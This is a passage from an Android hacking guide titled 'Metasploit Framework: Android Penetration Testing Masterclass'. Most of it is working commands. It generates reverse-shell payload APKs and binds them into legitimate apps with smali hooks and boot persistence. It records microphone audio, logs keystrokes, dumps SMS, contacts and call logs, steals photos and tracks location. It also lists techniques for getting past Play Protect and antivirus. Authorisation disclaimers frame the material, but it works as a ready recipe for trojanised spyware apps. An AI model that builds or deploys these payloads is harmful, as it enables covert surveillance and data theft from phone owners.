#         [*] Recording saved: /root/.msf4/loot/...

# Record for 30 seconds
meterpreter > record_mic -d 30

# Record for 60 seconds
meterpreter > record_mic -d 60

# Note: RECORD_AUDIO permission required!
```

### 26.3 Screenshots

```bash
# ═══════════════════════════════════════════════════════════════
# SCREENSHOTS
# ═══════════════════════════════════════════════════════════════

# Take screenshot
meterpreter > screenshot
# Output: [*] Screenshot saved: /root/.msf4/loot/...

# Take screenshot with custom path
meterpreter > screenshot ~/android-pentest/loot/screenshot.png

# Live screen sharing (if supported)
meterpreter > screenshare
```

### 26.4 Keylogging

```bash
# ═══════════════════════════════════════════════════════════════
# KEYLOGGING
# ═══════════════════════════════════════════════════════════════

# Start keylogger
meterpreter > keyscan_start
# Output: [*] Starting the keystroke sniffer ...

# Dump captured keystrokes
meterpreter > keyscan_dump
# Output: [*] Dumping captured keystrokes...
#         h-e-l-l-o- -w-o-r-l-d-Enter

# Stop keylogger
meterpreter > keyscan_stop
# Output: [*] Stopping the keystroke sniffer...
```

## Chapter 27: Network Operations

```bash
# ═══════════════════════════════════════════════════════════════
# NETWORK OPERATIONS
# ═══════════════════════════════════════════════════════════════

# Show network interfaces
meterpreter > ifconfig
# Shows all network interfaces and their IP addresses

# Show routing table
meterpreter > route

# Show ARP table (neighboring devices)
meterpreter > arp
# Shows other devices on the same network

# Show active network connections
meterpreter > netstat

# WiFi geolocation (find device location via WiFi)
meterpreter > wlan_geolocate
# Output: [*] Google indicates the device is near: Mumbai, Maharashtra
```

## Chapter 28: File System Operations

```bash
# ═══════════════════════════════════════════════════════════════
# FILE SYSTEM OPERATIONS
# ═══════════════════════════════════════════════════════════════

# Show current directory
meterpreter > pwd
# Output: /

# List files
meterpreter > ls

# Change directory
meterpreter > cd /sdcard

# Navigate to common locations
meterpreter > cd /sdcard/DCIM/Camera    # Photos
meterpreter > cd /sdcard/Download        # Downloads
meterpreter > cd /sdcard/WhatsApp/Media  # WhatsApp media

# Download a file
meterpreter > download /sdcard/DCIM/Camera/photo.jpg
# Output: [*] Downloading: /sdcard/DCIM/Camera/photo.jpg → photo.jpg
#         [*] Downloaded: 2.50 MiB

# Download entire directory
meterpreter > download /sdcard/DCIM/Camera/ ~/android-pentest/loot/photos/

# Upload a file
meterpreter > upload ~/android-pentest/payloads/tool.apk /sdcard/Download/

# Search for files
meterpreter > search -f *.jpg
meterpreter > search -f *.pdf
meterpreter > search -f *.db
meterpreter > search -f *.txt

# Read a file
meterpreter > cat /sdcard/Download/notes.txt
```

## Chapter 29: Maintaining Access

```bash
# ═══════════════════════════════════════════════════════════════
# PERSISTENCE
# ═══════════════════════════════════════════════════════════════

# Method 1: Migrate to another process
meterpreter > ps                          # List processes
meterpreter > migrate <pid>              # Migrate to a stable process

# Method 2: The bound APK already has persistence!
# If you used the binding method with BootReceiver,
# the payload will restart on device reboot.

# Method 3: Install additional persistence
# (Be careful - multiple payloads increase detection risk)

# Check if payload survives app restart
meterpreter > shell
# In shell:
# am force-stop com.google.android.calculator
# Then reopen the app - payload should reconnect!
```

---

# PART 7: EVASION AND ADVANCED TECHNIQUES

---

## Chapter 30: Bypassing Google Play Protect

```bash
# ═══════════════════════════════════════════════════════════════
# BYPASSING GOOGLE PLAY PROTECT
# ═══════════════════════════════════════════════════════════════
#
# Google Play Protect scans sideloaded apps for known malware.
# The default Metasploit payload IS detected by Play Protect.
#
# Bypass techniques:
#
# 1. CHANGE PACKAGE NAME
#    - Default "com.metasploit.stage" is KNOWN
#    - Change to something legitimate
#
# 2. CHANGE APP NAME AND ICON
#    - Don't use "Main Activity"
#    - Use legitimate-looking names
#
# 3. REDUCE PERMISSIONS
#    - Don't request ALL permissions at once
#    - Only request what the app type needs
#
# 4. OBFUSCATE SMALI CODE
#    - Rename classes and methods
#    - Add junk code
#    - Use reflection
#
# 5. ENCRYPT PAYLOAD
#    - Encrypt the payload bytes
#    - Decrypt at runtime
#
# 6. USE CUSTOM DEX LOADER
#    - Don't use standard payload classes
#    - Load DEX from assets at runtime
#
# 7. SIGN WITH DIFFERENT KEY
#    - Each APK should have a unique signing key
#
# ═══════════════════════════════════════════════════════════════
```

## Chapter 31: Bypassing Antivirus on Android

```bash
# ═══════════════════════════════════════════════════════════════
# ANDROID ANTIVIRUS BYPASS TECHNIQUES
# ═══════════════════════════════════════════════════════════════
#
# Many Android devices have third-party antivirus installed.
# Common AV apps: Avast, McAfee, Norton, Kaspersky, ESET
#
# Bypass techniques:
#
# 1. ENCODING (basic, often insufficient alone)
#    msfvenom uses encoders, but they're well-known
#
# 2. CUSTOM PAYLOAD (most effective)
#    - Write your own payload loader
#    - Don't use standard Meterpreter classes
#    - Use native code (C/C++) instead of Java
#
# 3. PROCESS INJECTION
#    - Inject into a legitimate process
#    - Payload runs within trusted process memory
#
# 4. FILELESS EXECUTION
#    - Load payload from network
#    - Never write to disk
#    - Execute entirely in memory
#
# 5. POLYMORPHIC CODE
#    - Change payload signature each time
#    - Use different encoding each generation
#
# ═══════════════════════════════════════════════════════════════
```

---

# PART 8: REAL-WORLD SCENARIOS

---

## Chapter 35: Lab Exercise 1: Basic APK Attack

```bash
# ═══════════════════════════════════════════════════════════════
# LAB EXERCISE 1: BASIC APK ATTACK
# ═══════════════════════════════════════════════════════════════
#
# OBJECTIVE: Generate a payload APK, deliver it to an Android
# emulator, and establish a Meterpreter session.
#
# PREREQUISITES:
# - Kali Linux with Metasploit installed
# - Android emulator running (or physical device)
# - ADB connected to device
#
# TIME: 15 minutes
#
# ═══════════════════════════════════════════════════════════════

# STEP 1: Open Terminal in Kali Linux

# STEP 2: Find your IP address
ip addr show | grep "inet " | grep -v 127.0.0.1
# Note your IP (e.g., 192.168.1.10)

# STEP 3: Generate payload
cd ~/android-pentest
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "Lab Test" \
    -f apk \
    -o payloads/lab1_basic.apk

# STEP 4: Start listener (in a NEW terminal)
# Terminal 2:
msfconsole -q -x "
    use exploit/multi/handler;
    set payload android/meterpreter/reverse_tcp;
    set LHOST 192.168.1.10;
    set LPORT 4444;
    exploit"

# STEP 5: Install on device (in Terminal 1)
adb devices  # Verify connection
adb install payloads/lab1_basic.apk

# STEP 6: Open the app on device
adb shell am start -n com.metasploit.stage/.MainActivity

# STEP 7: Check Terminal 2
# You should see:
# [*] Sending stage (79994 bytes)
# [*] Meterpreter session 1 opened
# meterpreter >

# STEP 8: Explore!
meterpreter > sysinfo
meterpreter > getuid
meterpreter > dump_sms
meterpreter > dump_contacts
meterpreter > screenshot

# STEP 9: Clean up
meterpreter > exit
adb uninstall com.metasploit.stage

# ═══════════════════════════════════════════════════════════════
# EXERCISE COMPLETE! You've successfully:
# ✅ Generated an Android payload
# ✅ Set up a listener
# ✅ Delivered and installed the payload
# ✅ Established a Meterpreter session
# ✅ Extracted data from the device
# ═══════════════════════════════════════════════════════════════
```

## Chapter 36: Lab Exercise 2: Bound APK Attack

```bash
# ═══════════════════════════════════════════════════════════════
# LAB EXERCISE 2: BOUND APK ATTACK
# ═══════════════════════════════════════════════════════════════
#
# OBJECTIVE: Bind a payload with a legitimate app, deliver it,
# and maintain access while the app is used normally.
#
# TIME: 30 minutes
#
# ═══════════════════════════════════════════════════════════════

# STEP 1: Get a legitimate APK (extract from emulator)
adb shell pm list packages | head -20
# Pick a simple app, e.g., calculator
PACKAGE_NAME=$(adb shell pm list packages | grep calc | head -1 | cut -d: -f2)
APK_PATH=$(adb shell pm path $PACKAGE_NAME | cut -d: -f2)
adb pull $APK_PATH original_apps/legit_app.apk

# STEP 2: Generate payload
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o payloads/lab2_payload.apk

# STEP 3: Decompile both
apktool d original_apps/legit_app.apk -o decompiled/legit -f
apktool d payloads/lab2_payload.apk -o decompiled/payload -f

# STEP 4: Copy payload Smali
mkdir -p decompiled/legit/smali/com/metasploit/stage/
cp decompiled/payload/smali/com/metasploit/stage/* \
   decompiled/legit/smali/com/metasploit/stage/

# STEP 5: Add permissions to manifest
for perm in INTERNET ACCESS_NETWORK_STATE READ_PHONE_STATE \
            RECEIVE_BOOT_COMPLETED WAKE_LOCK; do
    sed -i "/<application/i\\    <uses-permission android:name=\"android.permission.$perm\" />" \
        decompiled/legit/AndroidManifest.xml
done

# STEP 6: Add service to manifest
sed -i '/<\/application>/i\
    <service android:name="com.metasploit.stage.MainService" android:exported="false">\
        <intent-filter><action android:name="com.metasploit.stage.MainService"/></intent-filter>\
    </service>\
    <receiver android:name="com.metasploit.stage.BootReceiver" android:exported="true">\
        <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>\
    </receiver>' \
    decompiled/legit/AndroidManifest.xml

# STEP 7: Find and hook launcher Activity
LAUNCHER=$(grep -B 5 "MAIN" decompiled/legit/AndroidManifest.xml | \
    grep "android:name" | head -1 | sed 's/.*="//' | sed 's/".*//')
SMALI_PATH=$(echo $LAUNCHER | sed 's/\./\//g')
SMALI_FILE="decompiled/legit/smali/${SMALI_PATH}.smali"
SUPER_LINE=$(grep -n "invoke-super.*onCreate" "$SMALI_FILE" | head -1 | cut -d: -f1)

# Add payload start code after invoke-super
sed -i "${SUPER_LINE}a\\
    new-instance v0, Landroid/content/Intent;\\
    const-class v1, Lcom/metasploit/stage/MainService;\\
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\\
    invoke-virtual {p0, v0}, L${SMALI_PATH};->startService(Landroid/content/Intent;)Landroid/content/ComponentName;" \
    "$SMALI_FILE"

# STEP 8: Rebuild
apktool b decompiled/legit -o bound_apps/lab2_bound_unsigned.apk

# STEP 9: Align and sign
zipalign -v 4 bound_apps/lab2_bound_unsigned.apk \
    bound_apps/lab2_bound_aligned.apk

keytool -genkeypair -v \
    -keystore signing_keys/lab2.jks -alias lab2 \
    -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass lab2pass -keypass lab2pass \
    -dname "CN=Lab Test" 2>/dev/null

apksigner sign \
    --ks signing_keys/lab2.jks --ks-key-alias lab2 \
    --ks-pass pass:lab2pass --key-pass pass:lab2pass \
    --out bound_apps/lab2_bound_signed.apk \
    bound_apps/lab2_bound_aligned.apk

# STEP 10: Start listener (new terminal)
msfconsole -q -x "
    use exploit/multi/handler;
    set payload android/meterpreter/reverse_tcp;
    set LHOST 192.168.1.10;
    set LPORT 4444;
    set ExitOnSession false;
    exploit -j"

# STEP 11: Install and test
adb install -r bound_apps/lab2_bound_signed.apk

# Open the app - it should work normally AND connect back!
# Open the app on the device or via:
adb shell am start -n $LAUNCHER

# STEP 12: Verify
# In msfconsole:
sessions -l
sessions -i 1

meterpreter > sysinfo
meterpreter > dump_sms

# The app works normally - user has no idea!
# Payload persists until app is uninstalled.

# ═══════════════════════════════════════════════════════════════
# EXERCISE COMPLETE! You've successfully:
# ✅ Bound a payload with a legitimate app
# ✅ Modified AndroidManifest.xml
# ✅ Hooked payload into app startup
# ✅ Rebuilt and signed the APK
# ✅ Delivered and tested the bound APK
# ✅ Maintained access while app works normally
# ═══════════════════════════════════════════════════════════════
```

---

# PART 9: REFERENCE

---

## Chapter 40: Complete Command Reference

### Msfvenom Android Commands

```bash
# ═══════════════════════════════════════════════════════════════
# MSFVENOM ANDROID QUICK REFERENCE
# ═══════════════════════════════════════════════════════════════

# LIST ANDROID PAYLOADS
msfvenom -l payloads | grep android

# LIST OUTPUT FORMATS
msfvenom -l formats | grep apk

# ═══════════════════════════════════════════════════════════════
# BASIC PAYLOAD GENERATION
# ═══════════════════════════════════════════════════════════════

# Reverse TCP (most common)
msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f apk -o payload.apk

# Reverse HTTP
msfvenom -p android/meterpreter/reverse_http LHOST=X.X.X.X LPORT=8080 -f apk -o payload.apk

# Reverse HTTPS (encrypted)
msfvenom -p android/meterpreter/reverse_https LHOST=X.X.X.X LPORT=443 -f apk -o payload.apk

# Stageless Reverse TCP
msfvenom -p android/meterpreter_reverse_tcp LHOST=X.X.X.X LPORT=4444 -f apk -o payload.apk

# Simple Shell
msfvenom -p android/shell/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f apk -o payload.apk

# ═══════════════════════════════════════════════════════════════
# CUSTOMIZED PAYLOAD
# ═══════════════════════════════════════════════════════════════

msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=X.X.X.X \
    LPORT=4444 \
    --app-name "App Name" \
    --app-icon /path/to/icon.png \
    -f apk \
    -o payload.apk

# ═══════════════════════════════════════════════════════════════
# RAW SHELLCODE
# ═══════════════════════════════════════════════════════════════

msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f raw -o shellcode.bin
msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f dalvik -o payload.dex
```

### Meterpreter Android Commands

```bash
# ═══════════════════════════════════════════════════════════════
# METERPRETER ANDROID QUICK REFERENCE
# ═══════════════════════════════════════════════════════════════

# SYSTEM INFO
sysinfo                              # System information
getuid                               # Current user
getpid                               # Process ID
getprivs                             # Privileges

# DATA EXTRACTION
dump_sms                             # Dump SMS messages
dump_contacts                        # Dump contacts
dump_calls                           # Dump call logs

# SURVEILLANCE
webcam_list                          # List cameras
webcam_snap -i 1                     # Front camera photo
webcam_snap -i 2                     # Back camera photo
record_mic -d 10                     # Record 10s audio
screenshot                           # Take screenshot
keyscan_start                        # Start keylogger
keyscan_dump                         # Dump keystrokes
keyscan_stop                         # Stop keylogger

# FILE SYSTEM
pwd                                  # Current directory
ls                                   # List files
cd <path>                            # Change directory
cat <file>                           # Read file
download <remote> [local]            # Download file
upload <local> [remote]              # Upload file
search -f <pattern>                  # Find files

# NETWORK
ifconfig                             # Network interfaces
netstat                              # Network connections
arp                                  # ARP table
route                                # Routing table
wlan_geolocate                       # WiFi geolocation

# PROCESS
ps                                   # List processes
migrate <pid>                        # Migrate to process
kill <pid>                           # Kill process
execute -f <cmd>                     # Execute command

# SESSION
background                           # Background session
sessions -l                          # List all sessions
exit                                 # Close session
```

## Chapter 41: Troubleshooting Guide

```
╔═══════════════════════════════════════════════════════════════════╗
║                  TROUBLESHOOTING GUIDE                            ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  PROBLEM: Payload doesn't connect                                  ║
║  ──────────────────────────────                                    ║
║  CHECK:                                                            ║
║  1. LHOST in payload = LHOST in listener?                          ║
║  2. LPORT in payload = LPORT in listener?                          ║
║  3. Listener is running? (jobs -l)                                 ║
║  4. Device has internet access?                                    ║
║  5. Firewall blocking the port?                                    ║
║  6. Device and Kali on same network?                               ║
║                                                                    ║
║  PROBLEM: "App not installed"                                      ║
║  ──────────────────────────────                                    ║
║  CHECK:                                                            ║
║  1. APK is signed? (apksigner verify app.apk)                      ║
║  2. "Unknown sources" enabled on device?                           ║
║  3. Sufficient storage space?                                      ║
║  4. Conflicting package name?                                      ║
║                                                                    ║
║  PROBLEM: App crashes immediately                                   ║
║  ──────────────────────────────                                    ║
║  CHECK:                                                            ║
║  1. Smali injection syntax correct?                                ║
║  2. Manifest XML well-formed?                                      ║
║  3. All referenced classes exist?                                  ║
║  4. Check logcat: adb logcat | grep -i crash                      ║
║                                                                    ║
║  PROBLEM: Google Play Protect blocks installation                  ║
║  ──────────────────────────────                                    ║
║  SOLUTION:                                                         ║
║  1. Change package name (not com.metasploit.stage)                 ║
║  2. Disable Play Protect on test device                            ║
║  3. Use obfuscation techniques                                     ║
║  4. Bind with legitimate app                                       ║
║                                                                    ║
║  PROBLEM: Session dies quickly                                      ║
║  ──────────────────────────────                                    ║
║  SOLUTION:                                                         ║
║  1. Migrate to stable process                                      ║
║  2. Use reverse_https instead of reverse_tcp                       ║
║  3. Add sleep time between callbacks                               ║
║  4. Use stageless payload                                          ║
║                                                                    ║
║  PROBLEM: Apktool build fails                                      ║
║  ──────────────────────────────                                    ║
║  CHECK:                                                            ║
║  1. Smali syntax errors in injection                               ║
║  2. Missing resources referenced in manifest                       ║
║  3. XML formatting errors in manifest                              ║
║  4. Try: apktool b dir/ -o output.apk 2>&1 | grep ERROR           ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

## Chapter 42: Cheat Sheets

### Quick Command Reference Card

```
╔═══════════════════════════════════════════════════════════════════╗
║           ANDROID METASPLOIT QUICK REFERENCE CARD                  ║
║                        by EFXTv                                    ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  ═══ GENERATE PAYLOAD ═══                                         ║
║  msfvenom -p android/meterpreter/reverse_tcp \                    ║
║      LHOST=X LPORT=Y -f apk -o payload.apk                       ║
║                                                                    ║
║  ═══ START LISTENER ═══                                           ║
║  msfconsole -q -x "use exploit/multi/handler;\                    ║
║      set payload android/meterpreter/reverse_tcp;\                ║
║      set LHOST=X; set LPORT=Y; exploit"                          ║
║                                                                    ║
║  ═══ INSTALL APK ═══                                              ║
║  adb install payload.apk                                          ║
║  adb install -r payload.apk    (replace existing)                 ║
║                                                                    ║
║  ═══ DECOMPILE ═══                                                ║
║  apktool d app.apk -o output_dir/                                 ║
║                                                                    ║
║  ═══ REBUILD ═══                                                  ║
║  apktool b output_dir/ -o rebuilt.apk                             ║
║                                                                    ║
║  ═══ SIGN ═══                                                     ║
║  zipalign -v 4 input.apk aligned.apk                              ║
║  apksigner sign --ks key.jks --ks-pass pass:X --out signed.apk \ ║
║      aligned.apk                                                  ║
║                                                                    ║
║  ═══ SESSIONS ═══                                                 ║
║  sessions -l                    List sessions                     ║
║  sessions -i 1                  Interact with session             ║
║  sessions -k 1                  Kill session                      ║
║                                                                    ║
║  ═══ METERPRETER ═══                                              ║
║  sysinfo                      System info                         ║
║  dump_sms                     SMS messages                        ║
║  dump_contacts                Contacts                            ║
║  dump_calls                   Call logs                           ║
║  webcam_snap                  Photo                               ║
║  record_mic -d 10             Audio                               ║
║  screenshot                   Screenshot                          ║
║  background                   Background session                  ║
║  exit                         Close session                       ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

## Chapter 43: Resources and Next Steps

```
CONTINUED LEARNING:
│
├── Practice Platforms
│   ├── HackTheBox (hackthebox.com)
│   ├── TryHackMe (tryhackme.com)
│   ├── VulnHub (vulnhub.com)
│   └── PentesterLab (pentesterlab.com)
│
├── Certifications
│   ├── OSCP (Offensive Security Certified Professional)
│   ├── CEH (Certified Ethical Hacker)
│   ├── GPEN (GIAC Penetration Tester)
│   └── eJPT (eLearnSecurity Junior Penetration Tester)
│
├── Books
│   ├── "Android Hacker's Handbook"
│   ├── "Metasploit: The Penetration Tester's Guide"
│   ├── "Mobile Application Hacker's Handbook"
│   └── "The Hacker Playbook 3"
│
├── Online Resources
│   ├── OWASP Mobile Security (mas.owasp.org)
│   ├── Metasploit Documentation (docs.metasploit.com)
│   ├── Offensive Security (offsec.com)
│   └── Android Developer Docs (developer.android.com)
│
└── Communities
    ├── Reddit: r/netsec, r/HowToHack
    ├── Discord: Security communities
    ├── Twitter/X: @metasploit, @rapid7
    └── DEF CON, Black Hat, BSides conferences
```

---

## Final Words from EFXTv

```
╔═══════════════════════════════════════════════════════════════════╗
║                                                                    ║
║       "The best way to learn security is to practice it.          ║
║        The best way to practice is in a controlled lab.            ║
║        The best way to succeed is to stay ethical."                ║
║                                                                    ║
║                                           — EFXTv                  ║
║                                                                    ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  This guide covered EVERYTHING you need to know about              ║
║  Android penetration testing with Metasploit:                      ║
║                                                                    ║
║  ✅ Building Android payloads                                      ║
║  ✅ Customizing APKs (name, icon, permissions)                     ║
║  ✅ Binding payloads with legitimate apps                          ║
║  ✅ Setting up listeners (handlers)                                ║
║  ✅ Post-exploitation on Android                                   ║
║  ✅ Evasion techniques                                             ║
║  ✅ Real-world lab exercises                                       ║
║                                                                    ║
║  REMEMBER:                                                         ║
║  • Always get WRITTEN AUTHORIZATION                                ║
║  • Stay within your DEFINED SCOPE                                  ║
║  • Document EVERYTHING                                             ║
║  • Report findings RESPONSIBLY                                     ║
║  • Never use these skills for malicious purposes                   ║
║                                                                    ║
║  Stay legal. Stay ethical. Keep learning.                          ║
║                                                                    ║
║                                    — EFXTv, 2026                   ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

**Document Information:**
- **Title:** Metasploit Framework: Android Penetration Testing Masterclass
- **Author:** EFXTv
- **Version:** 1.0
- **Last Updated:** July 2026
- **Classification:** For Authorized Security Professionals Only

---

*This document is provided for educational and authorized security testing purposes only. The author (EFXTv) assumes no responsibility for any misuse of this information. Always obtain proper written authorization before conducting any security testing activities.*


*<a href="https://buymeacoffee.com/efxtv" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>*

---
